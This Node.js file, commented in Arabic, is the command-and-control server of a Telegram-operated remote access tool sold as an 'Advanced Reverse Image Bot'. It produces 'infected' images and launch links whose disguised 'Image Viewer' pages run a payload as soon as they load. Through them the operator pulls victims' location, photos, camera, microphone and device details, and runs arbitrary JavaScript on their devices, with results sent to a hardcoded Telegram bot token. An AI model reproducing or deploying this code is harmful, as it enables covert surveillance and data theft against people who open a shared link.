const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');
const AdvancedPayloadSystem = require('./payload-system');

// 🔧 إعدادات البوت
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
const SERVER_URL = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://your-app.vercel.app';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// أنظمة التخزين
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();
const payloadSystem = new AdvancedPayloadSystem();

// إعدادات middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({
  limit: '100mb',
  extended: true
}));
app.use(express.static('public'));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }
});

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال عكسي جديد:', socket.id);

  socket.on('reverse_handshake', async (data) => {
    const { device_id, image_id, payload_id, platform, userAgent, url, ip, device_info } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      image_id: image_id,
      payload_id: payload_id,
      platform: platform,
      userAgent: userAgent,
      url: url,
      ip: ip,
      device_info: device_info,
      connected: true,
      connected_at: new Date()
    };

    reverseSessions.set(device_id, sessionData);
    payloadSystem.registerSession(device_id, sessionData);

    // إرسال إشعار للتليجرام
    await appBot.sendMessage(
      id,
      `🦠 جلسة عكسية نشطة!\n\n` +
      `📱 الجهاز: ${device_id}\n` +
      `🖼️ الصورة: ${image_id}\n` +
      `🎯 البايلود: ${payload_id}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n` +
      `🔗 الرابط: ${url}\n` +
      `📍 الأيبي: ${ip}\n\n` +
      `✅ الجلسة جاهزة للتحكم الكامل`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ أوامر سريعة", callback_data: `quick_cmd:${device_id}` },
              { text: "📊 معلومات الجهاز", callback_data: `device_info:${device_id}` }
            ],
            [
              { text: "📍 الموقع", callback_data: `get_location:${device_id}` },
              { text: "🖼️ سحب الصور", callback_data: `get_photos:${device_id}` }
            ],
            [
              { text: "📳 الاهتزاز", callback_data: `vibrate:${device_id}` },
              { text: "🔋 البطارية", callback_data: `battery:${device_id}` }
            ],
            [
              { text: "🛑 إنهاء الجلسة", callback_data: `cmd_kill:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    let displayResult = result;
    if (result.length > 3000) {
      displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
    }
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: <code>${command}</code>\n` +
      `📊 الناتج:\n<pre>${displayResult}</pre>`,
      { 
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ أمر جديد", callback_data: `cmd_exec:${device_id}` },
              { text: "🔄 تحديث", callback_data: `refresh:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام التلغيم المتقدم للصور ==========

// 🖼️ دالة لدمج البايلود في الصورة بشكل مخفي
async function createInfectedImage(originalImageBuffer, imageId) {
    try {
        console.log('🎨 بدء عملية تلغيم الصورة المتقدمة...');
        
        // 🔥 إنشاء بايلود متقدم
        const payloadResult = payloadSystem.createUniversalPayload(imageId, SERVER_URL);
        const payloadId = payloadResult.payloadId;
        
        const image = sharp(originalImageBuffer);
        
        // معالجة الصورة مع إضافة علامة مائية مخفية
        const infectedImage = await image
            .png({
                quality: 90,
                compressionLevel: 9
            })
            .composite([{
                input: Buffer.from(`
                    <svg width="500" height="100">
                        <rect width="500" height="100" fill="rgba(0,0,0,0.01)"/>
                        <text x="250" y="50" font-family="Arial" font-size="12" fill="rgba(0,0,0,0.01)" 
                              text-anchor="middle" dominant-baseline="middle">
                            RS_${payloadId}_${Date.now()}
                        </text>
                    </svg>
                `),
                top: 10,
                left: 10
            }])
            .toBuffer();
        
        console.log('✅ تم تلغيم الصورة مع البايلود المتقدم');
        
        return {
            imageBuffer: infectedImage,
            payloadId: payloadId,
            imageId: imageId
        };
        
    } catch (error) {
        console.error('❌ خطأ في تلغيم الصورة:', error);
        throw error;
    }
}

// ========== نظام معالجة الصور ==========

// 📤 معالجة رفع الصور
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    try {
        const name = req.file.originalname;
        const model = req.headers.model || 'غير معروف';
        
        console.log('📸 تم استلام صورة:', name);
        
        if (req.file.mimetype.startsWith('image/')) {
            const imageId = uuidv4();
            
            // حفظ الصورة مؤقتاً
            infectedImages.set(imageId, {
                imageBuffer: req.file.buffer,
                model: model,
                filename: name,
                timestamp: new Date()
            });
            
            // إرسال رسالة مع الأزرار
            await appBot.sendMessage(
                id,
                `📸 تم استلام صورة من <b>${model}</b>\n\n` +
                `اختر الإجراء المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🦠 صنع صورة ملغمة", 
                                    callback_data: `create_infected:${imageId}` 
                                }
                            ],
                            [
                                { 
                                    text: "📤 إرسال عادي", 
                                    callback_data: `normal_send:${imageId}` 
                                }
                            ]
                        ]
                    }
                }
            );
            
            res.json({ status: 'success', message: 'تم الاستلام' });
            
        } else {
            await appBot.sendDocument(id, req.file.buffer, {
                caption: `📁 ملف من <b>${model}</b>`,
                parse_mode: "HTML"
            }, { filename: name });
            
            res.json({ status: 'success', message: 'تم الرفع' });
        }
    } catch (error) {
        console.error('❌ خطأ في الرفع:', error);
        res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
    }
});

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = message.chat.id;
    
    console.log('🔄 تم الضغط على زر:', data);
    
    try {
        if (data.startsWith('create_infected:')) {
            const imageId = data.split(':')[1];
            
            if (infectedImages.has(imageId)) {
                const imageInfo = infectedImages.get(imageId);
                
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "⏳ جاري صنع الصورة الملغمة المتقدمة..." 
                });
                
                await appBot.sendChatAction(chatId, 'upload_photo');
                
                // 🔥 إنشاء الصورة الملغمة المتقدمة
                const result = await createInfectedImage(imageInfo.imageBuffer, imageId);
                
                // إرسال الصورة الملغمة
                await appBot.sendDocument(
                    chatId, 
                    result.imageBuffer,
                    {
                        caption: `🦠 صورة ملغمة متقدمة جاهزة!\n\n` +
                                `🆔 المعرف: <code>${result.imageId}</code>\n` +
                                `🎯 البايلود: <code>${result.payloadId}</code>\n` +
                                `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                                `🚀 الميزات الجديدة:\n` +
                                `• ✅ يعمل في الواتساب وتلقرام وجميع التطبيقات\n` +
                                `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                                `• 📳 تشغيل الاهتزاز عن بعد\n` +
                                `• 🖼️ سحب الصور والملفات\n` +
                                `• 🎥 الوصول للكاميرا والميكروفون\n` +
                                `• 📱 معلومات الجهاز الكاملة\n` +
                                `• 🔄 اتصال تلقائي مستمر\n\n` +
                                `🔗 رابط التشغيل:\n` +
                                `<code>${SERVER_URL}/launch/${result.payloadId}</code>\n\n` +
                                `🎯 شارك الصورة أو الرابط لفتح جلسات جديدة!`,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { 
                                        text: "🔗 نسخ الرابط", 
                                        callback_data: `copy_link:${result.payloadId}` 
                                    },
                                    { 
                                        text: "🔄 صنع أخرى", 
                                        callback_data: "new_infected" 
                                    }
                                ],
                                [
                                    { 
                                        text: "📱 الجلسات النشطة", 
                                        callback_data: "active_sessions" 
                                    }
                                ]
                            ]
                        }
                    },
                    {
                        filename: `infected_${imageInfo.filename}`,
                        contentType: 'image/png'
                    }
                );
                
                console.log('✅ تم إرسال الصورة الملغمة المتقدمة');
                
            } else {
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "❌ الصورة لم تعد متاحة" 
                });
            }
        }
        else if (data.startsWith('normal_send:')) {
            const imageId = data.split(':')[1];
            
            if (infectedImages.has(imageId)) {
                const imageInfo = infectedImages.get(imageId);
                
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "📤 جاري إرسال الصورة..." 
                });
                
                await appBot.sendPhoto(chatId, imageInfo.imageBuffer, {
                    caption: `📸 صورة عادية من ${imageInfo.model}`
                });
            }
        }
        else if (data === 'new_infected') {
            await appBot.sendMessage(
                chatId,
                `🦠 أرسل لي الصورة التي تريد تلغيمها...\n\n` +
                `سأقوم بتحويلها إلى صورة ملغمة تفتح جلسات تحكم كاملة!`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔙 رجوع", callback_data: "back_to_main" }]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('copy_link:')) {
            const payloadId = data.split(':')[1];
            const link = `${SERVER_URL}/launch/${payloadId}`;
            
            await appBot.answerCallbackQuery(callbackQuery.id, { 
                text: `✅ تم نسخ الرابط: ${link}` 
            });
            
            await appBot.sendMessage(
                chatId,
                `🔗 رابط التشغيل المباشر:\n\n` +
                `<code>${link}</code>\n\n` +
                `🎯 شارك هذا الرابط لفتح جلسات جديدة!`,
                { parse_mode: "HTML" }
            );
        }
        else if (data.startsWith('cmd_exec:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `⚡ أدخل الأمر لتنفيذه على الجهاز <code>${deviceId}</code>:\n\n` +
                `📝 الأوامر المتاحة:\n` +
                `• <code>معلومات</code> - معلومات كاملة عن الجهاز\n` +
                `• <code>الموقع</code> - تحديد الموقع الدقيق\n` +
                `• <code>اهتزاز</code> - تشغيل الاهتزاز\n` +
                `• <code>البطارية</code> - حالة البطارية\n` +
                `• <code>الصور</code> - سحب الصور من الجهاز\n` +
                `• <code>الكاميرا</code> - الوصول للكاميرا\n` +
                `• <code>الميكروفون</code> - الوصول للميكروفون\n` +
                `• <code>التخزين</code> - عرض التخزين المحلي\n` +
                `• <code>لقطة</code> - لقطة شاشة\n` +
                `• <code>الشبكة</code> - معلومات الشبكة\n` +
                `• <code>فرمتة</code> - محاكاة الفرمتة\n` +
                `• <code>js:كود</code> - تنفيذ كود جافاسكريبت\n\n` +
                `أدخل الأمر الآن:`,
                {
                    parse_mode: "HTML",
                    reply_markup: { force_reply: true }
                }
            );
            
            infectedImages.set('pending_command', { deviceId: deviceId });
        }
        else if (data.startsWith('get_location:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الموقع'
                });
                
                await appBot.sendMessage(chatId, `📍 جاري تحديد موقع الجهاز ${deviceId}...`);
            }
        }
        else if (data.startsWith('get_photos:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الصور'
                });
                
                await appBot.sendMessage(chatId, `🖼️ جاري سحب الصور من الجهاز ${deviceId}...`);
            }
        }
        else if (data.startsWith('device_info:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'معلومات'
                });
                
                await appBot.sendMessage(chatId, `📊 جاري جمع معلومات الجهاز ${deviceId}...`);
            }
        }
        else if (data.startsWith('vibrate:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'اهتزاز'
                });
                
                await appBot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز على الجهاز ${deviceId}...`);
            }
        }
        else if (data.startsWith('battery:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'البطارية'
                });
                
                await appBot.sendMessage(chatId, `🔋 جاري قراءة حالة البطارية للجهاز ${deviceId}...`);
            }
        }
        else if (data.startsWith('quick_cmd:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `⚡ الأوامر السريعة للجهاز <code>${deviceId}</code>:\n\n` +
                `اختر الأمر المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "📍 الموقع", callback_data: `get_location:${deviceId}` },
                                { text: "📸 الصور", callback_data: `get_photos:${deviceId}` }
                            ],
                            [
                                { text: "📊 المعلومات", callback_data: `device_info:${deviceId}` },
                                { text: "📳 الاهتزاز", callback_data: `vibrate:${deviceId}` }
                            ],
                            [
                                { text: "🔋 البطارية", callback_data: `battery:${deviceId}` },
                                { text: "🔄 تحديث", callback_data: `refresh:${deviceId}` }
                            ],
                            [
                                { text: "⚡ أمر مخصص", callback_data: `cmd_exec:${deviceId}` },
                                { text: "🔙 رجوع", callback_data: `back_to_main` }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('cmd_kill:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.disconnect();
                reverseSessions.delete(deviceId);
                
                await appBot.sendMessage(chatId, `🛑 تم إنهاء الجلسة: ${deviceId}`);
            }
        }
        else if (data === 'active_sessions') {
            const activeSessions = Array.from(reverseSessions.keys());
            
            if (activeSessions.length === 0) {
                await appBot.sendMessage(chatId, '📭 لا توجد جلسات عكسية نشطة حالياً');
            } else {
                let sessionsText = `🦠 الجلسات العكسية النشطة: ${activeSessions.length}\n\n`;
                
                activeSessions.forEach(deviceId => {
                    const session = reverseSessions.get(deviceId);
                    const duration = Math.round((new Date() - session.connected_at) / 1000);
                    
                    sessionsText += `📱 <code>${deviceId}</code>\n` +
                                 `💻 ${session.platform}\n` +
                                 `⏰ ${duration} ثانية\n` +
                                 `🔗 ${session.url}\n\n`;
                });
                
                await appBot.sendMessage(chatId, sessionsText, { parse_mode: "HTML" });
            }
        }
        else if (data === 'back_to_main') {
            await appBot.sendMessage(
                chatId,
                `🎯 بوت الجلسات العكسية المتقدم - الإصدار 5.0.0\n\n` +
                `📊 الإحصائيات الحالية:\n` +
                `• 🔗 الجلسات النشطة: ${reverseSessions.size}\n` +
                `• 🖼️ الصور الملغمة: ${infectedImages.size}\n\n` +
                `✨ الميزات الجديدة:\n` +
                `• 🎯 تحكم كامل في الأجهزة\n` +
                `• 📍 تحديد الموقع الدقيق\n` +
                `• 📳 تشغيل الاهتزاز\n` +
                `• 🖼️ سحب الصور والملفات\n` +
                `• 🔋 معلومات البطارية\n` +
                `• 🛠️ أوامر متقدمة\n\n` +
                `🔧 اختر الإجراء المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "🦠 صنع صورة ملغمة", callback_data: "new_infected" },
                                { text: "📱 الجلسات النشطة", callback_data: "active_sessions" }
                            ],
                            [
                                { text: "⚡ الأوامر السريعة", callback_data: "quick_commands" },
                                { text: "📊 إحصائيات", callback_data: "system_stats" }
                            ]
                        ]
                    }
                }
            );
        }

    } catch (error) {
        console.error('❌ خطأ في المعالجة:', error);
        await appBot.answerCallbackQuery(callbackQuery.id, { 
            text: "❌ حدث خطأ أثناء المعالجة" 
        });
    }
});

// 📨 معالجة الردود على الأوامر
appBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من صلاحية المستخدم
    if (String(chatId) !== String(id)) {
        await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
        return;
    }

    // معالجة الردود على الأوامر
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text;
        
        if (replyText.includes('أدخل الأمر لتنفيذه')) {
            const command = text;
            
            if (infectedImages.has('pending_command')) {
                const pending = infectedImages.get('pending_command');
                const deviceId = pending.deviceId;
                
                if (reverseSessions.has(deviceId)) {
                    const session = reverseSessions.get(deviceId);
                    
                    session.socket.emit('command', {
                        device_id: deviceId,
                        command: command
                    });
                    
                    await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
                } else {
                    await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
                }
                
                infectedImages.delete('pending_command');
            }
        }
    }

    // الأوامر النصية
    if (text === '/start' || text === '/start') {
        await appBot.sendMessage(
            chatId,
            `🎯 بوت الجلسات العكسية المتقدم - الإصدار 5.0.0\n\n` +
            `📊 الإحصائيات الحالية:\n` +
            `• 🔗 الجلسات النشطة: ${reverseSessions.size}\n` +
            `• 🖼️ الصور الملغمة: ${infectedImages.size}\n\n` +
            `✨ الميزات الجديدة:\n` +
            `• 🎯 تحكم كامل في الأجهزة\n` +
            `• 📍 تحديد الموقع الدقيق\n` +
            `• 📳 تشغيل الاهتزاز\n` +
            `• 🖼️ سحب الصور والملفات\n` +
            `• 🔋 معلومات البطارية\n` +
            `• 🛠️ أوامر متقدمة\n\n` +
            `🔧 اختر الإجراء المطلوب:`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🦠 صنع صورة ملغمة", callback_data: "new_infected" },
                            { text: "📱 الجلسات النشطة", callback_data: "active_sessions" }
                        ],
                        [
                            { text: "⚡ الأوامر السريعة", callback_data: "quick_commands" },
                            { text: "📊 إحصائيات", callback_data: "system_stats" }
                        ]
                    ]
                }
            }
        );
    }
    else if (text === '📊 إحصائيات النظام') {
        const stats = {
            reverse_sessions: reverseSessions.size,
            infected_images: infectedImages.size,
            server_uptime: Math.round(process.uptime())
        };
        
        await appBot.sendMessage(
            chatId,
            `📊 إحصائيات النظام\n\n` +
            `🦠 الجلسات العكسية: ${stats.reverse_sessions}\n` +
            `🖼️ الصور الملغمة: ${stats.infected_images}\n` +
            `⏰ مدة التشغيل: ${stats.server_uptime} ثانية\n` +
            `🟢 الحالة: نشط ومستقر\n\n` +
            `🔧 الإصدار: 5.0.0`,
            { parse_mode: "HTML" }
        );
    }
    
    // معالجة استقبال الصور مباشرة
    if (msg.photo && msg.photo.length > 0) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        
        try {
            await appBot.sendChatAction(chatId, 'typing');
            
            // تحميل الصورة
            const fileLink = await appBot.getFileLink(fileId);
            const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
            const imageBuffer = Buffer.from(response.data);
            
            const imageId = uuidv4();
            
            // حفظ الصورة مؤقتاً
            infectedImages.set(imageId, {
                imageBuffer: imageBuffer,
                filename: `photo_${imageId}.jpg`,
                timestamp: new Date()
            });
            
            // معالجة الصورة تلقائياً
            await appBot.sendMessage(
                chatId,
                `📸 تم استلام صورتك!\n` +
                `🦠 جاري تلغيم الصورة...`,
                { parse_mode: "HTML" }
            );
            
            await appBot.sendChatAction(chatId, 'upload_photo');
            
            // 🔥 تلغيم الصورة
            const result = await createInfectedImage(imageBuffer, imageId);
            
            // إرسال الصورة الملغمة
            await appBot.sendDocument(
                chatId,
                result.imageBuffer,
                {
                    caption: `🦠 صورة ملغمة متقدمة جاهزة!\n\n` +
                            `🆔 المعرف: <code>${result.imageId}</code>\n` +
                            `🎯 البايلود: <code>${result.payloadId}</code>\n` +
                            `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                            `🚀 الميزات الجديدة:\n` +
                            `• ✅ يعمل في الواتساب وتلقرام وجميع التطبيقات\n` +
                            `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                            `• 📳 تشغيل الاهتزاز عن بعد\n` +
                            `• 🖼️ سحب الصور والملفات\n` +
                            `• 🎥 الوصول للكاميرا والميكروفون\n` +
                            `• 📱 معلومات الجهاز الكاملة\n` +
                            `• 🔄 اتصال تلقائي مستمر\n\n` +
                            `🔗 رابط التشغيل:\n` +
                            `<code>${SERVER_URL}/launch/${result.payloadId}</code>\n\n` +
                            `🎯 شارك الصورة أو الرابط لفتح جلسات جديدة!`,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🔗 نسخ الرابط", 
                                    callback_data: `copy_link:${result.payloadId}` 
                                },
                                { 
                                    text: "🔄 صنع أخرى", 
                                    callback_data: "new_infected" 
                                }
                            ],
                            [
                                { 
                                    text: "📱 الجلسات النشطة", 
                                    callback_data: "active_sessions" 
                                }
                            ]
                        ]
                    }
                },
                {
                    filename: `infected_${imageId}.png`,
                    contentType: 'image/png'
                }
            );
            
            console.log('✅ تم إرسال الصورة الملغمة تلقائياً');
            
        } catch (error) {
            console.error('❌ خطأ في معالجة الصورة:', error);
            await appBot.sendMessage(
                chatId,
                `❌ حدث خطأ أثناء معالجة الصورة\n\n` +
                `الخطأ: ${error.message}`,
                { parse_mode: "HTML" }
            );
        }
        
        return;
    }
});

// ========== نظام البايلود الإضافي ==========

// 🌐 صفحة تشغيل البايلود
app.get('/launch/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    const payloadData = payloadSystem.getPayload(payloadId);
    
    if (!payloadData) {
        return res.status(404).send('Payload not found');
    }

    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Image Viewer</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 20px;
                font-family: Arial, sans-serif;
                background: #1a1a1a;
                color: white;
                text-align: center;
            }
            .container {
                max-width: 100%;
                margin: 0 auto;
            }
            img {
                max-width: 100%;
                height: auto;
                border-radius: 10px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            }
            .loading {
                font-size: 18px;
                margin: 20px 0;
                color: #58a6ff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🖼️ معاينة الصورة</h2>
            <div class="loading">جاري تحميل الصورة...</div>
            <div id="image-container"></div>
        </div>

        <script>
            // تشغيل البايلود فوراً
            ${payloadData.payload}
            
            // محاكاة تحميل الصورة
            setTimeout(() => {
                document.querySelector('.loading').innerHTML = '✅ تم تحميل الصورة بنجاح';
                document.getElementById('image-container').innerHTML = 
                    '<p>📱 جاري الاتصال بالنظام...</p>' +
                    '<p>⚡ جاهز للتحكم الكامل</p>';
            }, 1500);

            // إعادة توجيه احتياطي
            setTimeout(() => {
                window.location.href = '${SERVER_URL}/open/${payloadId}';
            }, 3000);
        </script>
    </body>
    </html>
    `);
});

// 🌐 صفحة فتح البايلود
app.get('/open/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    const payloadData = payloadSystem.getPayload(payloadId);
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Opening Image</title>
        <script>
            // تشغيل البايلود مباشرة
            ${payloadData.payload}
            
            // محاولات متعددة للاتصال
            setTimeout(() => {
                window.location.href = '${SERVER_URL}/view/${payloadId}';
            }, 1000);
        </script>
    </head>
    <body>
        <p>جاري فتح الصورة...</p>
    </body>
    </html>
    `);
});

// 🌐 صفحة التتبع
app.get('/tracking/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    
    // تسجيل النشاط
    console.log('📱 Tracking activity from:', payloadId);
    
    res.send(`
    <script>
        // إرسال بيانات التتبع
        fetch('${SERVER_URL}/activity', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'tracking',
                payload_id: '${payloadId}',
                user_agent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString()
            })
        });
    </script>
    `);
});

// 📡 endpoint لجمع البيانات
app.post('/activity', express.json(), (req, res) => {
    const activity = req.body;
    console.log('📊 Activity received:', activity);
    
    // إرسال إشعار للتليجرام للنشاط المهم
    if (activity.type === 'tracking') {
        appBot.sendMessage(
            id,
            `🎯 نشاط جديد من البايلود!\n\n` +
            `🆔 البايلود: ${activity.payload_id}\n` +
            `🌐 المتصفح: ${activity.user_agent}\n` +
            `🔗 الرابط: ${activity.url}\n` +
            `⏰ الوقت: ${new Date(activity.timestamp).toLocaleString()}`,
            { parse_mode: "HTML" }
        );
    }
    
    res.json({ status: 'received' });
});

// 📡 endpoint للـ Long Polling
app.get('/polling/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    res.json([]);
});

// 📤 باقي ال endpoints
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'غير معروف';
    const text = req.body.text || 'لا يوجد نص';
    
    appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { 
        parse_mode: "HTML" 
    });
    
    res.json({ status: 'success' });
});

app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || 'غير معروف';
    const lat = req.body.lat;
    const lon = req.body.lon;
    
    appBot.sendLocation(id, lat, lon);
    appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { 
        parse_mode: "HTML" 
    });
    
    res.json({ status: 'success' });
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Advanced Reverse Image Bot</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                background: #0d1117; 
                color: #c9d1d9; 
            }
            .container { 
                max-width: 800px; 
                margin: 0 auto; 
                text-align: center;
            }
            .status { 
                background: #161b22; 
                padding: 20px; 
                border-radius: 10px; 
                margin: 20px 0; 
                border: 1px solid #30363d;
            }
            .feature {
                background: #1c2128;
                padding: 15px;
                margin: 10px 0;
                border-radius: 8px;
                border-right: 4px solid #58a6ff;
            }
            h1 { color: #58a6ff; }
            .btn {
                display: inline-block;
                padding: 10px 20px;
                margin: 10px;
                background: #238636;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Advanced Reverse Image Bot</h1>
            <p>الإصدار 5.0.0 - نظام التحكم الكامل عبر الصور</p>
            
            <div class="status">
                <h2>📊 System Status</h2>
                <p>🦠 الجلسات النشطة: ${reverseSessions.size}</p>
                <p>🖼️ الصور الملغمة: ${infectedImages.size}</p>
                <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
            </div>
            
            <div class="feature">
                <h3>🎯 الميزات الجديدة</h3>
                <p>• تحكم كامل في الأجهزة عن بعد</p>
                <p>• تحديد الموقع الدقيق</p>
                <p>• سحب الصور والملفات</p>
                <p>• تشغيل الاهتزاز</p>
                <p>• معلومات البطارية والنظام</p>
                <p>• يعمل في الواتساب وجميع التطبيقات</p>
            </div>
            
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
            
            <div style="margin-top: 30px;">
                <a href="https://t.me/VIP_MFM" class="btn">📞 الدعم الفني</a>
            </div>
        </div>
    </body>
    </html>
    `);
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`✅ البوت شغال على البورت: ${PORT}`);
    console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
    console.log(`🦠 نظام تلغيم الصور المتقدم جاهز`);
    console.log(`⚡ جاهز لاستقبال الصور وتشغيل الجلسات!`);
    console.log(`🔗 السيرفر: ${SERVER_URL}`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Rejection:', error);
});